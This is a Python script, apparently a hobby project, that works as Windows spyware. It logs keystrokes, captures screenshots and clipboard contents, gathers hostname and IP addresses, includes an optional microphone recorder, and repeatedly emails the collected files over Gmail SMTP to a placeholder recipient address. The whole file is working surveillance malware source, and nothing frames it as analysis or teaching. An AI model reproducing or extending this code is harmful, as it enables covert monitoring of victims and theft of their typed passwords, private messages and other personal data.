#libriaries

# EMAIL
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# smtplib.SMTP.debuglevel = 1

# COMPUTER INFORMATION
import socket
import platform

# CLIPBOARD
import win32clipboard

# LOGGING KEYS
from pynput.keyboard import Key, Listener

# Used for time related operations
import time

# Used for os interaction
import os

# MICROPHONE
from scipy.io.wavfile import write
import sounddevice as sd

# ENCRYPTION OF FILES
from cryptography.fernet import Fernet

# Perform certain tasks related to web requests and user input
import getpass
from requests import get

# SCREENSHOT
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info="key_log.txt"
system_info="sys_info.txt"
clipboard_info="CB.txt"
# audio_info="audio.wav"
audio_info="audio.mp3"
# ss_info="ss.jpge"
ss_info="ss.png"

microphone_time = 20
time_ittr = 15
no_of_ittr_end = 3

email_add="senders-mail"
app_password="password"
toaddr = "reciver-mail"

username = getpass.getuser()


file_path="C:\\Admin"
extend = "\\"
file_merge= file_path + extend

# send mail
def send_email(filename, attachment, toaddr):

    fromaddr = email_add

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Script testing mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, app_password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_info, file_path + extend + keys_info, toaddr)

# computer information
def comp_info():
    with open(file_path + extend + system_info, 'a') as f:
        hostname=socket.gethostname()
        IPaddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org").text
            f.write("Public IP Address" + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() +"\n" )
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddr + "\n")
comp_info()

# Copying clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_info, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")
copy_clipboard()

# Microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, fs, myrec)
# microphone()

# Screenshot
def ss():
    im=ImageGrab.grab()
    im.save(file_path + extend + ss_info)
ss()

no_of_ittr = 0
currTime = time.time()
stopingTime = time.time() + time_ittr

while no_of_ittr < no_of_ittr_end:
    count = 0
    keys= []
    def on_press(key):
        global keys, count, currTime

        print(key)
        keys.append(key)
        count+=1
        currTime = time.time()

        if count>=1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k=str(key).replace("'", "")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("Key")==-1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key==Key.esc:
            return False
        if currTime > stopingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currTime>stopingTime:
        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        ss()
        send_email(ss_info, file_path + extend + ss_info, toaddr)
        copy_clipboard()

        no_of_ittr +=1

        currTime = time.time()
        stopingTime = time.time() + time_ittr
